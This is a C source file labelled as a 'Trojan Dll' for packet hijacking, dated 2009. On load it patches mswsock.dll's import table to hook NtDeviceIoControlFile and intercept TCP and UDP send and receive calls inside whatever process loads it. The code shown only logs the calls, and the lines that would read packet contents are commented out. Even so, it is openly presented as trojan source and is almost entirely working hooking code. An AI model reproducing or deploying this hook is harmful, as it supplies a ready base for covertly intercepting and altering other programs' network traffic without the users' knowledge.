//////////////////////////////////////////////////////////////////////////
// Project:	Trojan Dll,Packet Hijacking
// Author:	0xQo
// Date:	2009-10-31
//////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <winnt.h>

#define AFD_RECV		0x12017
#define AFD_BIND		0x12003
#define AFD_CONNECT		0x12007
#define AFD_SET_CONTEXT	0x12047
#define AFD_RECV		0x12017
#define AFD_SEND		0x1201f
#define AFD_SELECT		0x12024
#define AFD_SENDTO		0x12023 
#define AFD_RECVFROM	0x1201B
#define CV				0x1201f

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID Pointer;
	} DUMMYUNIONNAME;

	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef
VOID
(NTAPI *PIO_APC_ROUTINE) (
						  IN PVOID ApcContext,
						  IN PIO_STATUS_BLOCK IoStatusBlock,
						  IN ULONG Reserved
						  );

typedef NTSTATUS (*NTDEVICEIOCONTROLFILE)(IN HANDLE FileHandle,
										  IN HANDLE Event OPTIONAL,
										  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
										  IN PVOID ApcContext OPTIONAL,
										  OUT PIO_STATUS_BLOCK IoStatusBlock,
										  IN ULONG IoControlCode,
										  IN PVOID InputBuffer OPTIONAL,
										  IN ULONG InputBufferLength,
										  OUT PVOID OutputBuffer OPTIONAL,
										  IN ULONG OutputBufferLength);

NTDEVICEIOCONTROLFILE ZwDeviceIoControlFile = NULL;


// Hook NtDeviceIoControlFile()
BOOL HookApi(BOOL bFlag);

// New Hook Function
NTSTATUS NewDeviceIoControlFile(IN HANDLE FileHandle,
								IN HANDLE Event OPTIONAL,
								IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
								IN PVOID ApcContext OPTIONAL,
								OUT PIO_STATUS_BLOCK IoStatusBlock,
								IN ULONG IoControlCode,
								IN PVOID InputBuffer OPTIONAL,
								IN ULONG InputBufferLength,
								OUT PVOID OutputBuffer OPTIONAL,
								IN ULONG OutputBufferLength);


int WINAPI DllMain(__in void * _HDllHandle, __in unsigned _Reason, __in_opt void * _Reserved)
{
	if (_Reason == DLL_PROCESS_ATTACH)
	{
		HookApi(TRUE);
	}
	else if (_Reason == DLL_PROCESS_DETACH)
	{
		HookApi(FALSE);
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
// Hook NtDeviceIoControlFile()
//////////////////////////////////////////////////////////////////////////
BOOL HookApi(BOOL bFlag)
{
	HMODULE hModule = LoadLibrary(TEXT("mswsock.dll"));
	if (hModule == NULL)
	{
		return FALSE;
	}

	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
	if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return FALSE;
	}

	PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((ULONG)hModule+pDosHdr->e_lfanew);
	if (pNtHdr->Signature != IMAGE_NT_SIGNATURE)
	{
		return FALSE;
	}

	if (pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress==0 ||
		pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size==0)
	{
		return FALSE;
	}

	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG)hModule+pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	PIMAGE_THUNK_DATA	ThunkData;
	while (pImportDescriptor->FirstThunk)
	{
		char* dllname = (PCHAR)((ULONG)hModule+pImportDescriptor->Name);
		if (stricmp(dllname,"ntdll.dll") != 0)
		{
			pImportDescriptor++;
			continue;
		}

		ThunkData = (PIMAGE_THUNK_DATA)((ULONG)hModule+pImportDescriptor->OriginalFirstThunk);
		int index = 1;
		while (ThunkData->u1.Function)
		{
			char* funame = (PCHAR)((ULONG)hModule+ThunkData->u1.AddressOfData+2);
			if (stricmp(funame,"NtDeviceIoControlFile") == 0)
			{
				ULONG dwRet,myAdr;
				PDWORD lpAdr = (PDWORD)((ULONG)hModule+(DWORD)pImportDescriptor->FirstThunk)+index-1;
				ZwDeviceIoControlFile = (NTDEVICEIOCONTROLFILE)(*(ULONG*)lpAdr);
				if (bFlag)
				{
					myAdr = (ULONG)NewDeviceIoControlFile;
				}
				else
				{
					myAdr = (ULONG)ZwDeviceIoControlFile;
				}
				WriteProcessMemory(GetCurrentProcess(),lpAdr,&myAdr,sizeof(ULONG),&dwRet);
				
				return TRUE;
			}
			index++;
			ThunkData++;
		}
		pImportDescriptor++;
	}

	return FALSE;
}



//////////////////////////////////////////////////////////////////////////
// New Hook Function
//////////////////////////////////////////////////////////////////////////
NTSTATUS NewDeviceIoControlFile(IN HANDLE FileHandle,
								IN HANDLE Event OPTIONAL,
								IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
								IN PVOID ApcContext OPTIONAL,
								OUT PIO_STATUS_BLOCK IoStatusBlock,
								IN ULONG IoControlCode,
								IN PVOID InputBuffer OPTIONAL,
								IN ULONG InputBufferLength,
								OUT PVOID OutputBuffer OPTIONAL,
								IN ULONG OutputBufferLength)
{
	NTSTATUS status;
	status = ZwDeviceIoControlFile(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,IoControlCode,InputBuffer,InputBufferLength,OutputBuffer,OutputBufferLength);
	if (!NT_SUCCESS(status))
	{
		return status;
	}

	if (IoControlCode!=AFD_SEND && IoControlCode!=AFD_RECV && IoControlCode!=AFD_SENDTO && IoControlCode!=AFD_RECVFROM)
	{
		return status;
	}

	__try{
		//PAFD_INFO AfdInfo = (PAFD_INFO)InputBuffer;
		//PVOID Buffer = AfdInfo->BufferArray->buf;
		//ULONG Len = AfdInfo->BufferArray->len;

		switch (IoControlCode)
		{
		case AFD_RECV:
			{
				OutputDebugStringA("[TCP Recv Packets]\n");
			}
			break;
		case AFD_SEND:
			{
				OutputDebugStringA("[TCP Send Packets]\n");
			}
			break;
		case AFD_SENDTO:
			{
				OutputDebugStringA("[UDP Sendto Packets]\n");
			}
			break;
		case AFD_RECVFROM:
			{
				OutputDebugStringA("[UDP RecvFrom Packets]\n");
			}
			break;
		}
	}__except(EXCEPTION_EXECUTE_HANDLER)
	{
		return status;
	}

	return status;
}